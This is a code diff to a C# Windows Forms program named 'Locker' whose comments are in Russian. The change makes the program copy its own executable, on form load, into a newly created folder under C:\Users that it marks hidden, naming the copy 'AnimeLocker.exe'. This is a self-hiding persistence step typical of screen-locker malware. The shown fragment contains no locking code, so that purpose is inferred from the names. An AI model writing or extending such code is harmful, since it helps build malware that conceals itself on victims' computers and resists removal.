@@ -10,6 +10,7 @@ using System.Diagnostics;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.IO;
 
 namespace Locker
 {
@@ -31,8 +32,11 @@ namespace Locker
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            //Создание копии
-            string targetPath = @"C:\Users\Public\";
+            //Создание копии в скрытой папке
+            string targetPath = @"C:\Users\CheAnime\";
+            Directory.CreateDirectory(targetPath);
+            DirectoryInfo dir = new DirectoryInfo(targetPath);
+            dir.Attributes |= FileAttributes.Hidden;
             string sourceFile = System.Windows.Forms.Application.ExecutablePath;
             string destFile = System.IO.Path.Combine(targetPath, "AnimeLocker.exe");
             if (System.Windows.Forms.Application.ExecutablePath != destFile)
